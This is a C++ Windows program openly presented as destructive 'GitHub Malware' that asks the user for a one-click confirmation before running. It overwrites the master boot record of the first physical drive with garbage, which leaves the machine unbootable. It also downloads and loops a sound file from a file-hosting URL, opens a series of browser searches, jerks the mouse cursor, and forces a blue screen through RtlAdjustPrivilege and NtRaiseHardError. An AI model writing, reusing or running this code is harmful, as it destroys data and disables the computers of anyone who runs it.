#include <iostream>
#include <urlmon.h>
#include <Windows.h>
#include <ntstatus.h>
#include <fstream>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "ntdll.lib")
#define SHUTDOWN_PRIVILEGE 19
#define OPTION_SHUTDOWN 6
void Entry();


typedef LONG NTSTATUS;
typedef NTSTATUS(NTAPI* PtrAdjPrv)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS(NTAPI* PtrSInfoProc)(HANDLE ProcessHandle, ULONG ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS error_status, ULONG number_of_parameters, ULONG unicode_string_parameter_mask, PULONG_PTR parameters, ULONG response_option, PULONG reponse);
enum {
	SeDebugPrivilege = 19,
	ProcessBreakOnTermination = 0x1d
};
using namespace std;
int played = false;
TCHAR path[MAX_PATH];

void ClearMBR() {
	DWORD Bytes;
	const unsigned char Clear_MBR = {};
	char GarbageOverwrite[512] = "7epu5CLkht2KXQlPVUTMrst5SbCiScUlRaNzS9lPegPXuSXh1AbJKqrpBBiKBVY1qyXkQ88Sj6YAdz7Z9HUaLQiKvY0ySOKHVfCCSDNIWImP5JnIoW2frK1NWWIkYWSz3Bj0Ceah3PtW00TMj2b9614U1ql0ZdjlwvOnT77D9glI3UjGVMe3wzhuPrBUfTt2OAajLaMJPHQFfB0R4GiPj0OiiKP7dDGlMTbTFHADm1qEjFkw6Z8lAFgTMVxKuakQvcpIpMAYxxcVS2ysPYsqqT1vS7eUKY72GSKN21IODOedUTUTvmeTiAswkeTwhsCY7OEPxZPriJ7wyDkSIY34OxdS87hpp8iICetQwY5YTmjX5BvzHDKRsICdBUM8ccGEOtGsilQrgYaPqLaPgpinYeshHHPeBNBi0wuCV7sUBK71eXbZjDzZCmXmZOBiDlAtNB4oFa4ZsnnDeCQCFciBDg4KdjdpAQUGGh0ccPag1gYoU733HcftaTCnCV7F6F1";
	HANDLE FirstSector = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(FirstSector, (LPCVOID)GarbageOverwrite, sizeof(GarbageOverwrite), 0, NULL);
	CloseHandle(FirstSector);
}

void ExecuteBSOD() {
	PtrAdjPrv RtlAdjustPrivilege = (PtrAdjPrv)GetProcAddress((HMODULE)LoadLibrary(L"ntdll.dll"), "RtlAdjustPrivilege");
	pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress((HMODULE)LoadLibrary(L"ntdll.dll"), "NtRaiseHardError");
	BOOLEAN enable;
	RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &enable);
	ULONG resp;
	NtRaiseHardError(STATUS_NOT_IMPLEMENTED, 0, 0, 0, OPTION_SHUTDOWN, &resp);
	return;
}

DWORD WINAPI OpenBrowser(LPVOID lparam) {
	for (int i = 0; i <= 4; i++) {
		string array_[] = { "https://www.google.com/search?q=how+to+sell+heroine+and+dont+get+caught", "https://www.google.com/search?q=minecraft+mods+cracked", "https://www.google.com/search?q=justinbieberfreedownloadsongs2021", "https://www.google.com/search?q=fortnite+cheats+no+virus", "https://thepiratebay.org" };
		string cmd = "start " + array_[i];
		system(cmd.c_str());
		Sleep(20000);
	}
	return 0;
}

DWORD WINAPI CreateMessageBoxes(LPVOID lparam) {
	MessageBox(NULL, L"Good luck on finding your VM Snapshot, hahaha!", L"Github Malware", MB_ICONERROR);
	return 0;
}

BOOL WINAPI Ctrlhandler(DWORD fdwCtrlType) {
	MessageBox(NULL, L"oh, is it dead?", L"Github Malware", MB_ICONERROR);
	ExecuteBSOD();
	return 0;
}


void RandomStuff() {
	GetCurrentDirectory(MAX_PATH, path);
	URLDownloadToFileA(NULL, "https://cdn-118.anonfiles.com/xdA8E149u9/7f999be1-1625498742/loud%20indian%20music.wav", (char)path + "/KJSDIFUSHGUESHG.wav", NULL, NULL);
	PlaySound(L"KJSDIFUSHGUESHG.wav", NULL, SND_LOOP);
	CreateThread(NULL, NULL, &OpenBrowser, NULL, NULL, NULL);
	while (true) {
		played = true;
		POINT pCursor;
		GetCursorPos(&pCursor);
		SetCursorPos(pCursor.x + 10, pCursor.y + 15);
		Sleep(250);
	}
	return;
}


void Entry() {
	MessageBox(NULL, L"Your PC has officially been infected by GitHub Malware. Good luck recovering it, nerd!", L"Github Malware", MB_ICONERROR);
	ClearMBR();
	RandomStuff();
	return;
}

int main()
{
   char c;
   const int confirmation1 = MessageBox(NULL, L"WANRING! This Open-Source prject is Malware! It will completely destroy your computer. Are you sure you want to execute it?", L"ALERT PLEASE READ", MB_YESNO);
   if (confirmation1 == IDYES) {
	   SetConsoleCtrlHandler(&Ctrlhandler, TRUE);
	   system("start https://pastebin.com/raw/rBFnbWFV");
	   Entry();
   }
   else {
	   MessageBox(NULL, L"Exitting..", L"Goodbye!", MB_OK);	
	   system("pause");
   }
   system("pause");
   return 0;
}
